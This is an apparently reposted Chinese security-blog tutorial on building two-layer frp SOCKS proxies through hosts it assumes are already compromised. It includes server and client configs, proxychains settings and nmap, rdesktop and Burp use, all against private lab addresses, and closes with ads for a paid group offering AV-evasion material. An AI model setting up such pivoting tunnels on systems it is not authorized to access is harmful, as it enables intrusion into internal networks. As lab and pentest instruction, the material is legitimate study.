> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-FQ3Kmnb0JY1O80C3aY5bA)

技巧｜frp 内网多层代理
=============

0x01 背景介绍
---------

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJVf5zHs1SjQHLeCR9uZkA7auU2O7wiazicoVPBbejvYEVAehFRvJ9Bias0g/640?wx_fmt=png)

假设：已经获取边界服务器（192.168.0.100）的服务器权限，win7 服务器（192.168.52.30）的权限 实现：

配置一层代理，访问 192.168.52.0/24 网段，以便访问第二层网络 (192.168.52.30)

配置二层代理，访问 192.168.93.0/24 网段，以便访问第三层网络 (192.168.93.30)

现在 ubuntu（web1）要充当 frp 客户端和 frp 服务端，以便访问第三层网络

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJVCK6ic18rJ5n7ffow6E4WMKSkgAoMf6z2gicuwksuDVPkHkuicsCahia2Cg/640?wx_fmt=png)

0x02 frp 一层代理（反向）
-----------------

### 服务端（server）

kali(192.168.0.107)

```
frps.ini<br style="visibility: visible;">--------------------------------------<br style="visibility: visible;">[common]<br style="visibility: visible;">#服务端监听端口，默认7000。监听来自客户端的流量请求<br style="visibility: visible;">bind_port = 7000
--------------------------------------
启动
chmod +777 frps
./frps -c ./frps.ini
```

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJVFmEohBnI71SUaG3HyBgZ1aN57DwUia3MrrPskZP6tMu4f8C2GPCWINg/640?wx_fmt=png)

### 客户端

ubuntu-web1(192.168.0.100)

```
会将客户端中所有的流量通过本地的一个随机端口转发给vps的7000端口，
我们访问vps的7777端口就相当于访问客户端的7000端口
frpc.ini
---------------------
[common]
server_addr = 192.168.0.107
server_port = 7000

[plugin_socks]
type = tcp
remote_port = 7777
plugin = socks5
----------------------
启动
chmod +777 frpc
nohup ./frpc -c ./frpc.ini >/dev/null 2>&1 &
```

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJVPAqU2yDMF1wgCp985gZFt1EHPxGWEib5vlCSNcIXM4MPutAcFriaia5Zg/640?wx_fmt=png)

先启动服务器，再启动客户端

frp 二层代理
--------

同时启动二层代理的服务端 frps

ubuntu-web1(192.168.0.100)

```
frps.ini
--------------------------------------
[common]
#服务端监听端口，默认7000。监听来自客户端的流量请求
bind_addr = 192.168.52.10
bind_port = 7000
--------------------------------------
启动
chmod +777 frps
./frps -c ./frps.ini
```

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJVLjOAUJ9CR6dia05Eqndy7hG6ndGnskjEaXfrDMGbjvu6gBdZRSNmpBA/640?wx_fmt=png)

### 客户端

web-pc1(192.168.52.30)

```
会将客户端中所有的流量通过本地的一个随机端口转发给vps的7000端口，
我们访问vps的7777端口就相当于访问客户端的7000端口
frpc.ini
---------------------
[common]
server_addr = 192.168.52.10
server_port = 7000

[plugin_socks]
type = tcp
remote_port = 7777
plugin = socks5
----------------------
启动
chmod +777 frpc
nohup ./frpc -c ./frpc.ini >/dev/null 2>&1 &
```

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJVp1numLylu9kQZcwQcSVmiaLlvBk7NyXxAQickUMhUpVPVcpnuPa6XlOA/640?wx_fmt=png)

0x04 测试连接
---------

kali 本地添加 proxy 配置

```
vim /etc/proxychains4.conf 
----------------------------------
socks5  192.168.0.107 7777
socks5 192.168.52.10 7777
----------------------------------
```

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJVG4869d4rtetvdPvgRMWAClXGpwYichGicpA69psQq7vFKH5uJrQDgIicQ/640?wx_fmt=png)

第一步 通过代理，使用 nmap 进行扫描

```
扫描二层网络
proxychains nmap -Pn -sT -sV -F -O 192.168.52.30
```

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJVygc818tU4bFC2v3Vs8lyl4UICe6lXXSSKCw0NRfyiaWGYsgGmxic0P0w/640?wx_fmt=png)

```
扫描三层网络
proxychains nmap -Pn -sT -sV -F -O 192.168.93.40
```

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJVUibsztqVNXAnJAMViazJG47TwIDTkDS2icS2L63icbciaFh7r7lMZ9RNBHA/640?wx_fmt=png)

第二步 远程连接

```
proxychains rdesktop 192.168.52.30
```

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJVB85vTribmLwM8dVxqr87ZCmibnORoaGvw1w0wSnB4Fd0l6Au8XufuA1A/640?wx_fmt=png)

```
proxychains rdesktop 192.168.93.40
```

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJVYWvzH4vO1pshGvfG7vU4HrTRMNOjgPsUPwIOBE02ibW50vJiaJBiabXGQ/640?wx_fmt=png)

第三步 浏览器开启代理，访问内网系统

```
访问二层网络
socks5 127.0.0.1 7777
http://192.168.52.30:8080/
```

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJVMiaibtUcsuBgOLr7nXVLVvDhiad6SNoe80hKnJImVeZgQwibwxUMuDHyAg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJVG86gnhh5fftOTCpYaiaeJqIibFkZcxGTXBgEFCrKaeXSnDucqIO0oXsA/640?wx_fmt=png)

```
访问三层网络
启动burp：
proxychains  burpsuite
firfox代理:
socks5 127.0.0.1 7777
http  127.0.0.1 8080
访问网站：
http://192.168.52.30:8080/
127.0.0.1:7777--firxfox:8080---192.168.52.10:7777---burp127.0.0.0:8080----发送
```

使用代理启动 burp

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJVPobPFEOU22MSJZxXJaq6hU4NX1eXU5S4bHUtMhop9hEAdJljULlibzA/640?wx_fmt=png)

浏览器开启 burp 代理

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJV79Y2RGQDecmjRLqTjH7hesnss29Gyt7azLpEpwTtPx6VXtsfsxSnYg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJVMYMl3kIZtNUr7vHeNA3TJhLLO4diaOUlU1PyWOppZEjaEf5RZ3nL3Ww/640?wx_fmt=png)

成功访问

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJV4G4GzL4BKx4jy4tic8FRrPWIIhA6ibicd5uXS4oZv5KW0JQtoiboR02SbA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJV0CJTrrNWibiaTQVgTvFwHFn3ESDOn1ENIPgIRicxuibibejUyPeViapc9uIg/640?wx_fmt=png)

查看后台 burp 的代理包

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJVXM2FPNFCBC2Ly6vHkuNLXBgJKUs6SYSCuhNgQEyNibS3MH4nMF0UA0Q/640?wx_fmt=png)

文末福利！！！
-------

加好友回复 “GO 黑帽子” 获《GO 黑帽子 - 渗透测试编程之道》一书
-------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_jpg/xG8Nt1c2ib4RMBXnMcryibnA2lFVxrz5R9Pkib2T63ibuJuDzzibQfxcMYq9Y7ahsMLvPYH3BPv5pVfw5aQC1IoxvfQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

> 原文作者：星球守护者
> 
> 原文地址：https://blog.csdn.net/qq_41901122/article/details/127190123

**免责声明**

由于传播、利用本公众号霜刃安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号霜刃安全及作者不为**此**承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**推荐阅读**

[漏洞｜没啥用的 CVE-2022-31289 Nexus Repository Manager 伪认证漏洞复现](http://mp.weixin.qq.com/s?__biz=MzkyODI3MTgwNQ==&mid=2247487012&idx=1&sn=f471d4058f550c3f3c70fe3c58e3d3b2&chksm=c21a12f6f56d9be08368978243549ccc3152797db9454ad60689dd1444ca75c9fe0b30fa66e9&scene=21#wechat_redirect)

[技巧｜资产收集对抗 - 子域名爆破](http://mp.weixin.qq.com/s?__biz=MzkyODI3MTgwNQ==&mid=2247486989&idx=1&sn=468cf50222b7a9a53db24f83840e4625&chksm=c21a12dff56d9bc991f7925ca020872060fe84848b004daeccb081f5660f99eb8822fa821434&scene=21#wechat_redirect)

[云安全｜子域名接管漏洞](http://mp.weixin.qq.com/s?__biz=MzkyODI3MTgwNQ==&mid=2247486941&idx=1&sn=e6b8636696b4fc38a5f039692d93accd&chksm=c21a110ff56d981911804ba2f538717c24349f1feee11565fa35aa077175e8f6ac03b357f031&scene=21#wechat_redirect)

[工具｜OneForAll - 全能的子域名收集工具](http://mp.weixin.qq.com/s?__biz=MzkyODI3MTgwNQ==&mid=2247486914&idx=1&sn=565f3b794150e284da52fe1ce687b211&chksm=c21a1110f56d9806ff58c7a6ab1690a7c33835c410e194e2d72db45fb6134c837a362fa151e4&scene=21#wechat_redirect)

[利用 DNS 上线 CS 及流量分析](http://mp.weixin.qq.com/s?__biz=MzkyODI3MTgwNQ==&mid=2247486890&idx=1&sn=4d9cc7c79727dce6f310eb6324518850&chksm=c21a1178f56d986e52c5a76f80f08e17f2e4e5025fd8648dd2be1145a116179d18395e7ec9ce&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**广告区**

**某大佬的星球，价格便宜实惠**

**买不了吃亏买不了上当**！  

**

**

**付费圈子**

  

  




**

  
**

  

  

  

  

  

**欢 迎 加 入 星 球 ！**

**代码审计 + 免杀 + 渗透学习资源 + 各种资料文档 + 各种工具 + 付费会员**

进成员内部群

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJVQSNsEjz3mLoUic4IX3m8fm8wPmDtS4VWba7aFiaCtjAmZUKvHDrUGJKg/640?wx_fmt=jpeg)

**星球的最近主题和星球内部工具一些展示**

![](https://mmbiz.qpic.cn/mmbiz_jpg/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJVib6Ds44rZdCMBllbMLwsiaWFPicCqnpVomM2s0wSvpLFt2MdEEHpBDt8g/640?wx_fmt=jpeg)  

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJVBZcF11v8Qn2QSc0vd53SX5iacq24PAibeO1VeROBfs3soVMYVpPOD3dg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/xG8Nt1c2ib4TC7SH9W8PuyrlIbyTjGxJVliacvmrjnnLrBPy11X1cOibzqVS8LqpwicOhmVuRZsaAsEQ6YT8tW9lOA/640?wx_fmt=png)